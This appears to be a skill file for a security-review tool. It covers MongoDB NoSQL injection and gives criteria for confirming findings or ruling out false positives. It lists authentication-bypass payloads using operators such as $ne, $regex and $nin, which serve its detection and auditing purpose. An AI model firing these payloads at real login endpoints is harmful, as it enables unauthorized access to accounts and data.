# NoSQL Injection — @mongorok skill
> cats: NOSQLI · severity: critical
> sources: PayloadsAllTheThings, HackTricks

## What it is
NoSQL injection occurs when an attacker manipulates queries by injecting malicious input into a NoSQL database query. Unlike SQL injection, NoSQL injection often exploits JSON-based queries and operators like `$ne`, `$gt`, `$regex`, or `$where` in MongoDB.

## Exploit payloads (from PayloadsAllTheThings)
- `db.products.find({ "price": userInput })`
- `db.products.find({ "price": { "$gt": 0 } })`
- `username[$ne]=toto&password[$ne]=toto`
- `login[$regex]=a.*&pass[$ne]=lol`
- `login[$gt]=admin&login[$lt]=test&pass[$ne]=1`
- `login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto`
- `{"username": {"$ne": null}, "password": {"$ne": null}}`
- `{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}`

## VERIFY
- CONFIRMED when: untrusted input reaches the sink/condition described above and
  NO mitigating control (input validation, allow-list, output encoding, auth/ownership
  check, or safe API) is present in the data path.
- FALSE POSITIVE when: a correct mitigation from Remediation is applied, the value is
  constant / allow-listed, or the matched symbol is a benign same-named API.
- LIKELY when: the dangerous pattern is present but the mitigating control or an exploit
  precondition is not visible in the reviewed code.

## References
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
- HackTricks: https://book.hacktricks.wiki/en/search.html?q=NoSQL%20Injection
- HackTricks Cloud: https://cloud.hacktricks.wiki/
